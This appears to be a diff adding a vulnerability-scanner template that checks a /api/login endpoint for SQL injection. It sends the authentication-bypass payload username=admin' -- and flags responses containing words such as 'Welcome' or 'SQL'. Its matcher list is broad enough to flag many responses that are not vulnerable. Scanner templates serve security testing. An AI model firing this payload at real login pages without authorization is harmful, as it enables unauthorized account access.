@@ -1,0 +1,22 @@
+id: custom-sqli-login
+info:
+  name: SQL Injection
+  author: role2-dev
+  severity: critical
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/login"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "username=admin%27%20--&password=123"
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "Welcome"
+          - "admin"
+          - "error"
+          - "OperationalError"
+          - "SQL"
+        condition: or
